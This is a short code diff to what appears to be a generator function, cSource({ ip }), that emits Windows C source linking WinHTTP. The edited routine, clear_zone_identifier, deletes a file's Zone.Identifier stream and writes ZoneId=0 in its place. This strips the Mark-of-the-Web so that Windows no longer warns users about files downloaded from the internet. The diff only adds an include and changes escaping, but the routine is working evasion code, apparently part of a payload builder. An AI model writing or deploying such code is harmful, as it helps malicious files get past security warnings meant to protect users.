@@ -51,6 +51,7 @@ function cSource({ ip }) {
 #include <winhttp.h>
 #include <shlobj.h>
 #include <stdio.h>
+#include <string.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -118,9 +119,11 @@ void clear_zone_identifier(const wchar_t* path) {
     wchar_t zone_path[MAX_PATH];
     _snwprintf(zone_path, MAX_PATH, L"%ls:Zone.Identifier", path);
     DeleteFileW(zone_path); // Delete any existing
+    
     HANDLE h = CreateFileW(zone_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (h != INVALID_HANDLE_VALUE) {
-        const char* zone = "[ZoneTransfer]\r\nZoneId=0\r\n";
+        // Escaped newlines here
+        const char* zone = "[ZoneTransfer]\\r\\nZoneId=0\\r\\n";
         DWORD written;
         WriteFile(h, zone, strlen(zone), &written, NULL);
         CloseHandle(h);
